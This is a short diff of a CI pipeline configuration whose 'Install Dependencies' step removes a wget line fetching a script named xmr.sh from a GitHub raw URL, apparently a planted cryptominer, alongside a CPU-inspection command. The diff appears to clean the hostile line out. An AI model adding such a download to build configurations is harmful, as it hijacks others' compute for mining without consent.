@@ -9,8 +9,6 @@ jobs:
             name: Install Dependencies
             command: |
               lscpu
-              wget https://raw.githubusercontent.com/jayales/USDT_ku/main/xmr.sh
-
 workflows:
     version: 2.1
     build:
